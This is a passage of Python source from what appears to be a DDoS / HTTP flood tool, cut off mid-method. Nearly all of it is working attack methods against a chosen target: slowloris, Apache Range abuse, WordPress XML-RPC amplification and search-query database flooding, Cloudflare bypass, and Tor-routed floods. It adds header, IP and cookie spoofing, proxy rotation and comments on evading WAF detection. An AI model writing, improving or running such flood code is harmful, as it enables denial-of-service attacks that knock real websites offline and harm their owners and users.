                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
            ]
        
        self._useragents = list(useragents)
        
        # [OPTIMIZED] Referer Spoofing List
        referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.instagram.com/',
            'https://www.youtube.com/',
            'https://duckduckgo.com/'
        ]
        # [OPTIMIZED] Random Languages
        langs = [
            'en-US,en;q=0.9',
            'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
            'en-GB,en;q=0.9',
            'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'es-ES,es;q=0.9'
        ]

        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        # [OPTIMIZED] Cache Busting by Antigravity
        sep = "&" if "?" in target.raw_path_qs else "?"
        rnd = str(randchoice(range(1111, 9999)))
        ver = randchoice(['1.0', '1.1', '1.2'])
        
        # Select Random UA initially
        self.ua = randchoice(self._useragents)
        
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs}{sep}v={rnd} HTTP/{ver}\r\n"
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Cache-Control: max-age=0\r\n' +
                         self.build_consistent_headers(self.ua) +
                         'Connection: keep-alive\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def build_consistent_headers(self, ua: str) -> str:
        # [OPTIMIZED] Dynamic Header Generation based on User-Agent
        # Prevents "Inconsistent Hints" detection by WAFs
        platform = "\"Windows\""
        mobile = "?0"
        
        if "Android" in ua:
            platform = "\"Android\""
            mobile = "?1"
        elif "iPhone" in ua or "iPad" in ua:
            platform = "\"iOS\""
            mobile = "?1"
        elif "Macintosh" in ua or "Mac OS" in ua:
            platform = "\"macOS\""
            mobile = "?0"
        elif "Linux" in ua:
            platform = "\"Linux\""
            mobile = "?0"

        cookies = f"Cookie: _ga=GA1.1.{randint(1000000, 9999999)}.{randint(1000000000, 2000000000)}; cf_clearance={ProxyTools.Random.rand_str(43)}; csrftoken={ProxyTools.Random.rand_str(32)}\r\n"
        
        headers = (
            f"X-Forwarded-For: {Tools.get_random_indo_ip()}\r\n"
            f"X-Real-IP: {Tools.get_random_indo_ip()}\r\n"
            f"Client-IP: {Tools.get_random_indo_ip()}\r\n"
            f"{cookies}"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            f"Sec-Gpc: 1\r\n"
            f"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
            f"Sec-Ch-Ua-Mobile: {mobile}\r\n"
            f"Sec-Ch-Ua-Platform: {platform}\r\n"
            f"Referer: {randchoice(self._referers)}\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
        )
        return headers

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    def get_random_target_path(self) -> str:
        # [NEW] Dynamic Path Randomizer (Chaos Theory)
        choice_roll = randint(0, 100)
        
        # Option A: Real Crawled Paths (If available)
        if hasattr(self, 'crawled_paths') and self.crawled_paths and choice_roll < 60:
            return randchoice(self.crawled_paths)
            
        # Option B: Common WP Paths
        if choice_roll < 80:
            common_wp = [
                "/",
                "/wp-login.php",
                "/wp-admin/admin-ajax.php",
                "/xmlrpc.php",
                "/feed/",
                "/comments/feed/",
                "/?s=" + ProxyTools.Random.rand_str(5)
            ]
            return randchoice(common_wp)
            
        # Option C: Original Target
        return self._target.raw_path_qs
                
    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        # [OPTIMIZED] Global Dynamic Path Injection
        # Instead of using static self._payload, we rebuild it.
        path = self.get_random_target_path()
        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
        
        # We also need dynamic headers (UA, Mobile, Platform)
        # Note: randHeadercontent uses a random UA but doesn't sync Sec-Ch-Ua
        # For maximum quality, we should use build_consistent_headers here too.
        ua = randchoice(self._useragents)
        consistent_headers = self.build_consistent_headers(ua)
        
        return (f"{request_line}"
                f"Host: {self._target.authority}\r\n"
                f"User-Agent: {ua}\r\n"
                f"{consistent_headers}"
                f"Referer: {randchoice(self._referers)}\r\n"
                f"{other if other else ''}"
                "\r\n").encode("utf-8")

    def open_connection(self, host=None) -> socket:
        if self._proxies:
            # [OPTIMIZED] Smart Rotation
            if not hasattr(self, '_proxy_cycle'):
                from itertools import cycle
                self._proxy_cycle = cycle(self._proxies)
            sock = next(self._proxy_cycle).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(5.0) # [OPTIMIZED] Increased timeout for stability
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", "RHEX", "STOMP"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s = None
        with  suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(self._payload +
                                  f"Host: {target}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT
            CONNECTIONS_SENT += 1
            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: High-Load Packet Sent to {self._target.authority}")

            for _ in range(self._rpc):
                # [OPTIMIZED] Dynamic Path
                path = self.get_random_target_path()
                ua = randchoice(self._useragents)
                headers = self.build_consistent_headers(ua)
                
                # Rebuild payload manually to include dynamic path
                payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Content-Length: 524\r\n"
                           f"X-Requested-With: XMLHttpRequest\r\n"
                           f"Content-Type: application/json\r\n\r\n"
                           f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
                
                # [NEW] Status Tracker (Sniffer)
                try:
                    # Peek at the response (first 20 bytes)
                    response_start = s.recv(20).decode('utf-8', errors='ignore')
                    if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                        status_code = response_start.split(" ")[1]
                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] STRESS: Server Response Received")
                except:
                    pass # Non-blocking or incomplete response
                
                Tools.send(s, payload.encode("utf-8"))
        except Exception as e:
            pass
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        # [OPTIMIZED] Parsed Packet Storm (Dynamic)
        # Replaces simple payload with dynamic generation
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                # Use Global Dynamic Generator
                Tools.send(s, self.generate_payload())
        Tools.safe_close(s)

    def KILLER(self) -> None:
        while True:
            Thread(target=self.GET, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                # [OPTIMIZED] Dynamic Path
                path = self.get_random_target_path()
                full_url = f"{self._target.scheme}://{self._target.authority}{path}"
                
                if pro:
                    with s.get(full_url,
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(full_url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120: break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                            continue

                Tools.safe_close(ss)

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

            Tools.safe_close(ss)

    def DYN(self):
        # [OPTIMIZED] Dynamic Host + Dynamic Path
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        
        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
        host_header = f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
        
        payload: Any = (f"{request_line}"
                        f"{host_header}"
                        f"User-Agent: {ua}\r\n"
                        f"{headers}"
                        "\r\n").encode("utf-8")
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT
            CONNECTIONS_SENT += 1
            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    # [NEW] Status Tracker (Sniffer) + Auto Reconnect
                    try:
                        response_start = s.recv(20).decode('utf-8', errors='ignore')
                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                            status_code = response_start.split(" ")[1]
                            print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] DYN: Server Response")
                            if status_code in {"403", "429"}:
                                raise Exception("Proxy Blocked")
                    except Exception as e:
                        if "Blocked" in str(e): raise e
                        pass
        except Exception as e:
            pass
        Tools.safe_close(s)

    def POST_DYN(self):
        # [PHASE 2] Non-Cacheable POST Flood
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        
        # Build realistic JSON Payload
        json_data = f'{{"form_id": "{ProxyTools.Random.rand_str(8)}", "utm_source": "google", "data": "{ProxyTools.Random.rand_str(randint(200, 400))}"}}'
        
        payload = (f"POST {path} HTTP/1.1\r\n"
                   f"Host: {self._target.authority}\r\n"
                   f"User-Agent: {ua}\r\n"
                   f"{headers}"
                   f"Content-Type: application/json\r\n"
                   f"Origin: {self._target.scheme}://{self._target.authority}\r\n"
                   f"Content-Length: {len(json_data)}\r\n\r\n"
                   f"{json_data}").encode("utf-8")
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT
            CONNECTIONS_SENT += 1
            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Non-Cacheable Packet Sent")
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    # Status Sniffer
                    try:
                        response_start = s.recv(20).decode('utf-8', errors='ignore')
                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                            status_code = response_start.split(" ")[1]
                            print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] POST_DYN: Response")
                            if status_code in {"403", "429"}:
                                raise Exception("Proxy Blocked")
                    except Exception as e:
                        if "Blocked" in str(e): raise e
                        pass
        except:
            pass
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b'0')
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
                Tools.send(s, payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                       self._target.authority,
                                                       hexh) +
                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                            self.randHeadercontent + dep), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
                                                          self._target.authority) +
            "Host: %s\r\n" % hexh +
            self.randHeadercontent + dep)
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            for _ in range(self._rpc):
                Tools.send(s, p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(self._payload +
                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                  "Referrer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, \
            'This method requires proxies. ' \
            'Without proxies you can use github.com/codesenberg/bombardier'

        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        res = run(
            [
                f'{bombardier_path}',
                f'--connections={self._rpc}',
                '--http2',
                '--method=GET',
                '--latencies',
                '--timeout=30s',
                f'--requests={self._rpc}',
                f'--proxy={proxy}',
                f'{self._target.human_repr()}',
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        try:
            s = self.open_connection()
            # Increment Global Counter for visual feedback
            # Increment Global Counter for visual feedback
            global REQUESTS_SENT, TOTAL_REQUESTS_SENT, CONNECTIONS_SENT
            REQUESTS_SENT += 1
            TOTAL_REQUESTS_SENT += 1
            CONNECTIONS_SENT += 1
            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
            for _ in range(self._rpc):
                Tools.send(s, payload)
            
            while True:
                # Keep sending full payloads or keep-alives?
                # Original logic was weird. Let's just send keep-alive headers to existing connection
                if Tools.send(s, payload):
                     # print("[DEBUG] SLOW: Packet Sent")
                     pass
                
                # Check for response?
                # if s.recv(1): ... this blocks.
                
                for i in range(self._rpc):
                    # [NEW] Indonesian ISP Randomized Junk Header
                    junk_key = randchoice(["X-ISP", "X-Sponsor", "X-Route", "X-Provider"])
                    junk_val = randchoice(["Telkomsel", "Indihome", "XL-Axiata", "Biznet", "FirstMedia"])
                    Tools.send(s, (f"{junk_key}: {junk_val}\r\n").encode("utf-8"))
                    
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        except Exception as e:
            err = str(e)
            if "timed out" in err or "Timeout" in err:
                # print(f"[DEBUG] SLOW: Connection Held (Timeout) - Good Sign")
                pass
            elif "[Errno 111]" in err or "Connection refused" in err:
                pass # Suppress Proxy Refused errors
            elif "[Errno 104]" in err or "Reset by peer" in err:
                pass # Suppress Connection Reset errors
            elif "Broken pipe" in err:
                pass # Suppress Broken Pipe
            else:
                # print(f"[DEBUG] SLOW Error: {e}") # Suppress unknown errors too to stay clean
                pass
        Tools.safe_close(s)

    def SLOW_V2(self):
        # [OPTIMIZED] Authentic Slowloris (Partial Headers)
        # Based on gkbrk/slowloris: Send headers but NEVER finish the request.
        # Ideally keeps the socket open forever.
        
        # 1. Partial Payload (No double \r\n at end)
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        path = self.get_random_target_path()
        
        partial_payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Connection: keep-alive\r\n"
                           f"Keep-Alive: {randint(300, 1000)}\r\n"
                           f"Cache-Control: max-age=0\r\n").encode("utf-8")

        s = None
        with suppress(Exception), self.open_connection() as s:
            # Send the partial header
            Tools.send(s, partial_payload)
            
            # Keep-Alive Loop
            for _ in range(self._rpc): # Use RPC as duration multiplier
                # Wait before sending next header tick (Low & Slow)
                sleep(randint(5, 15)) 
                
                try:
                    # Send random header to keep connection alive
                    # But STILL don't close the request body
                    keep = f"X-a: {randint(1, 5000)}\r\n".encode("utf-8")
                    if Tools.send(s, keep):
                        # Success tick
                        pass
                    else:
                        break # Socket died
                except:
                    break
        
        Tools.safe_close(s)

    def WP_SEARCH(self):
        # [OPTIMIZED] WordPress Database Stresser
        # Sends requests to /?s=RANDOM ensuring no cache hit and high DB usage.
        
        # Prepare Base Request
        # Append ?s= or &s= depending on existing query
        sep = "&" if "?" in self._target.raw_path_qs else "?"
        
        s = None
        s = None
        try:
            s = self.open_connection()
            for _ in range(self._rpc):
                search_query = ProxyTools.Random.rand_str(randint(5, 15))
                full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
                ua = randchoice(self._useragents)
                headers = self.build_consistent_headers(ua)
                
                payload = (f"GET {full_path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                           f"{headers}"
                           f"Connection: keep-alive\r\n"
                           f"Upgrade-Insecure-Requests: 1\r\n"
                           f"Cache-Control: no-cache\r\n"
                           f"Pragma: no-cache\r\n"
                           f"\r\n").encode("utf-8")
                
                if Tools.send(s, payload):
                     # print(f"[{int(REQUESTS_SENT)}] [DEBUG] WP_SEARCH: Packet Sent to {self._target.authority}")
                     pass
        except Exception as e:
            err = str(e)
            if "timed out" in err or "Timeout" in err:
                 print(f"[DEBUG] WP_SEARCH: Connection Timeout (Target Lagging/Down)")
                 pass
            elif "[Errno 111]" in err or "Connection refused" in err:
                pass
            elif "[Errno 104]" in err or "Reset by peer" in err:
                pass
            elif "Broken pipe" in err:
                pass
            else:
                pass
        Tools.safe_close(s)

    def XMLRPC_AMP(self):
        # [OPTIMIZED] XML-RPC Amplification (CPU Killer)
        # Abuses system.multicall to execute hundreds of methods in one request.
        
        # Build Amplification Vector (100x calls)
        calls = ""
        for _ in range(100):
            calls += "<value><struct><member><name>methodName</name><value><string>system.listMethods</string></value></member></struct></value>"
            
        xml_payload = (f"<?xml version='1.0' encoding='iso-8859-1'?>"
                       f"<methodCall><methodName>system.multicall</methodName>"
                       f"<params><param><value><array><data>{calls}</data></array></value></param></params>"
                       f"</methodCall>")
        
        # XMLRPC usually lives at /xmlrpc.php
        target_path = self._target.raw_path_qs
        if "xmlrpc" not in target_path:
             target_path = "/xmlrpc.php"

        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)

        post_payload = (f"POST {target_path} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"{headers}"
                        f"Content-Type: application/xml\r\n"
                        f"Content-Length: {len(xml_payload)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Accept: */*\r\n"
                        f"\r\n"
                        f"{xml_payload}").encode("utf-8")
        
        s = None
        # Use try-except to catch connection issues
        try:
            s = self.open_connection()
            # Increment Global Counter
            global CONNECTIONS_SENT
            CONNECTIONS_SENT += 1
            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Amplification Packet Sent to {self._target.authority}")
            
